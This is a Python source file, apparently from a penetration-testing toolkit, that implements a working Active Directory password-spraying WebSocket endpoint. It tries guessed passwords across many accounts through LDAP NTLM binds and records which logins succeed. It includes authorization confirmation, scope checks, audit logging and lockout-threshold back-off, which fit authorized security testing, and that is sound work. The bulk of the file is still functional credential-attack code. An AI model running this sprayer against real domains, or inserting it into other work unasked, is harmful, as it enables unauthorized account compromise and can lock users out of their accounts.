"""AD Password Sprayer — domain-aware, lockout-respecting.

Tries a small list of passwords against a large list of users via LDAP bind
(NTLM authentication). Before spraying, we read the domain's lockoutThreshold
and back off automatically when a user is at threshold-1 attempts.

We use LDAP bind specifically because it's the lightest-touch auth path —
no Kerberos pre-auth, no SMB session, just the bind. It still counts toward
the lockout counter.

WS  /ws/ad-spray
    client -> server:
        {"creds": {dc_host, domain, ...},  # `username`/`password` ignored
         "users": ["alice","bob",...],
         "passwords": ["Spring2026!","Winter2026!"],
         "delay_sec": 0.5,                  # between attempts
         "max_lockouts": 0}                 # stop after N lockouts (0 = unlimited)

    server -> client:
        {"type":"started","total","lockout_threshold","safe_threshold"}
        {"type":"attempt","user","password_index","status":"success"|"fail"|"locked"|"error","detail"}
        {"type":"progress","done","total","success","locked"}
        {"type":"done","elapsed","successes":[...],"locked_count","stopped"}
        {"type":"error","detail"}
"""
from __future__ import annotations

import asyncio
import logging
import time
from typing import Any

from fastapi import APIRouter, WebSocket, WebSocketDisconnect

from lib import audit_log, scope
from lib.ad_auth import CredsModel, domain_to_base_dn, open_ldap
from lib.errors import ErrorCode, ws_error
from lib.mode import get_mode
from lib.validators import validate_hostname

logger = logging.getLogger(__name__)

router = APIRouter(tags=["ad-spray"])


def _get_lockout_threshold(creds: CredsModel) -> int | None:
    """Pull lockoutThreshold from the domain policy.

    Returns the integer threshold (0 means "no lockout policy"), or None if we
    couldn't read it (bind failed, search failed, attribute missing). Callers
    must distinguish None from 0 — None means we have no safety information,
    not that there's no lockout policy.
    """
    try:
        conn = open_ldap(creds)
    except Exception as exc:
        logger.warning("ad_spray: open_ldap failed (%s) — lockout threshold unknown", exc)
        return None
    try:
        base = domain_to_base_dn(creds.domain)
        conn.search(
            search_base=base,
            search_filter="(objectClass=domainDNS)",
            attributes=["lockoutThreshold"],
        )
        if conn.entries:
            return int(conn.entries[0].lockoutThreshold.value or 0)
        logger.warning("ad_spray: lockoutThreshold search returned no entries")
        return None
    except Exception as exc:
        logger.warning("ad_spray: lockoutThreshold read failed (%s)", exc)
        return None
    finally:
        try: conn.unbind()
        except Exception: pass


def _try_bind(creds: CredsModel, user: str, password: str) -> tuple[str, str]:
    """Return (status, detail). status ∈ success / fail / locked / error."""
    from ldap3 import Server, Connection, NTLM
    dom = creds.domain.split(".")[0] if creds.domain else ""
    user_ntlm = f"{dom}\\{user}" if dom else user
    server = Server(creds.dc_host, use_ssl=creds.use_ssl)
    try:
        conn = Connection(server, user=user_ntlm, password=password,
                          authentication=NTLM, auto_bind=False)
        ok = conn.bind()
        if ok:
            try: conn.unbind()
            except Exception: pass
            return "success", ""
        # Inspect bind result for lockout hint
        desc = (conn.result or {}).get("description", "")
        msg = (conn.result or {}).get("message", "")
        # AD returns specific sub-statuses; 0xC0000234 is account locked out
        if "0000234" in msg or "locked" in msg.lower() or "locked" in desc.lower():
            return "locked", msg or desc
        return "fail", msg or desc
    except Exception as e:
        return "error", str(e)


@router.websocket("/ws/ad-spray")
async def spray_ws(ws: WebSocket) -> None:
    await ws.accept()
    stop = asyncio.Event()
    audit_id: str | None = None

    async def listen_for_stop() -> None:
        try:
            while True:
                msg = await ws.receive_json()
                if isinstance(msg, dict) and msg.get("action") == "stop":
                    stop.set(); return
        except Exception:
            stop.set()

    try:
        init = await ws.receive_json()
        engagement_id = init.get("engagement_id") or None
        if not bool(init.get("confirm_auth", False)):
            await ws.send_json(ws_error(
                ErrorCode.NEED_CONFIRM,
                "Confirm you have authorization to spray this domain.",
            ))
            await ws.close(); return

        creds = CredsModel(**init.get("creds", {}))
        users = list(init.get("users") or [])
        passwords = list(init.get("passwords") or [])
        delay = float(init.get("delay_sec", 0.5))
        max_lockouts = int(init.get("max_lockouts", 0))

        # Reject obviously malformed dc_host before we try to bind.
        try:
            creds.dc_host = validate_hostname(creds.dc_host, field="dc_host")
        except Exception as exc:
            await ws.send_json(ws_error(
                getattr(exc, "code", ErrorCode.INVALID_HOSTNAME),
                getattr(exc, "message", str(exc)) or "dc_host is required",
            ))
            await ws.close(); return

        confirm = bool(init.get("confirm", False))
        init_mode = str(init.get("mode", "")).strip().lower()
        mode = "engagement" if init_mode == "engagement" else (
            "lab" if init_mode == "lab" else get_mode(ws)
        )
        if not await scope.enforce_ws(
            ws, creds.dc_host, engagement_id, mode, confirm=confirm,
            active=True, action="ad_spray",
        ):
            return

        if not users or not passwords:
            await ws.send_json(ws_error(
                ErrorCode.VALIDATION_ERROR,
                "users[] and passwords[] both required",
            ))
            await ws.close(); return

        # We need an authenticated bind to read the policy. If we can't read it,
        # threshold_raw is None — the caller must opt in by setting
        # `acknowledge_unknown_threshold` before we'll proceed, otherwise we
        # could lock out every account we spray.
        threshold_raw = _get_lockout_threshold(creds)
        threshold_known = threshold_raw is not None
        ack_unknown = bool(init.get("acknowledge_unknown_threshold", False))
        if not threshold_known and not ack_unknown:
            await ws.send_json(ws_error(
                ErrorCode.NEED_CONFIRM,
                "Could not read domain lockoutThreshold (bind/search failed). "
                "Provide working `creds.username`/`creds.password` so we can read "
                "the policy, or pass `acknowledge_unknown_threshold: true` to "
                "spray without lockout protection (RISKY — may lock out users).",
            ))
            await ws.close(); return

        threshold = threshold_raw if threshold_known else 0
        safe = max(0, threshold - 1) if threshold > 0 else 0  # never hit the last attempt

        total = len(users) * len(passwords)
        try:
            audit_id = audit_log.start(
                tool="ad_spray",
                target=creds.domain or creds.dc_host,
                argv=[creds.dc_host, f"users={len(users)}",
                      f"passwords={len(passwords)}", f"delay={delay}"],
                engagement_id=engagement_id,
            )
        except Exception:
            logger.exception("audit_log.start failed (spray continues)")

        await ws.send_json({
            "type": "started", "total": total,
            "lockout_threshold": threshold,
            "threshold_known": threshold_known,
            "safe_threshold": safe,
            "audit_id": audit_id,
        })

        listener = asyncio.create_task(listen_for_stop())
        t0 = time.monotonic()
        per_user_failures: dict[str, int] = {}
        per_user_locked: set[str] = set()
        successes: list[dict[str, str]] = []
        locked_count = 0
        done = 0

        loop = asyncio.get_event_loop()

        for pi, password in enumerate(passwords):
            if stop.is_set():
                break
            for user in users:
                if stop.is_set():
                    break
                if user in per_user_locked:
                    continue
                # If we're at threshold-1 attempts for this user, skip to avoid lockout
                if threshold > 0 and per_user_failures.get(user, 0) >= safe:
                    await ws.send_json({"type": "attempt", "user": user,
                                        "password_index": pi,
                                        "status": "skipped",
                                        "detail": "would-trigger-lockout"})
                    done += 1
                    continue
                status, detail = await loop.run_in_executor(
                    None, _try_bind, creds, user, password,
                )
                done += 1
                if status == "success":
                    successes.append({"user": user, "password": password})
                    await ws.send_json({"type": "attempt", "user": user,
                                        "password_index": pi,
                                        "status": "success",
                                        "detail": ""})
                elif status == "locked":
                    per_user_locked.add(user)
                    locked_count += 1
                    await ws.send_json({"type": "attempt", "user": user,
                                        "password_index": pi,
                                        "status": "locked",
                                        "detail": detail[:200]})
                    if max_lockouts and locked_count >= max_lockouts:
                        stop.set()
                else:  # fail or error
                    per_user_failures[user] = per_user_failures.get(user, 0) + 1
                    await ws.send_json({"type": "attempt", "user": user,
                                        "password_index": pi,
                                        "status": status,
                                        "detail": detail[:200]})

                if done % 5 == 0 or done == total:
                    await ws.send_json({"type": "progress",
                                        "done": done, "total": total,
                                        "success": len(successes),
                                        "locked": locked_count})
                await asyncio.sleep(delay)

        listener.cancel()
        elapsed = round(time.monotonic() - t0, 2)
        await ws.send_json({
            "type": "done",
            "elapsed": elapsed,
            "successes": successes,
            "locked_count": locked_count,
            "stopped": stop.is_set(),
        })
        if audit_id:
            summary = (f"{len(successes)}/{total} success, "
                       f"{locked_count} locked, {elapsed}s")
            try:
                if stop.is_set():
                    audit_log.stopped(audit_id, summary=summary)
                else:
                    audit_log.complete(audit_id, summary=summary)
            except Exception:
                logger.exception("audit_log finalize failed")
    except WebSocketDisconnect:
        stop.set()
        if audit_id:
            try: audit_log.stopped(audit_id, summary="client disconnected")
            except Exception: pass
    except Exception as exc:
        logger.exception("ad_spray_ws unhandled exception")
        if audit_id:
            try: audit_log.error(audit_id, f"{type(exc).__name__}: {exc}")
            except Exception: pass
        try:
            await ws.send_json(ws_error(
                ErrorCode.INTERNAL,
                "internal error during password spray",
            ))
        except Exception:
            pass
    finally:
        try: await ws.close()
        except Exception: pass
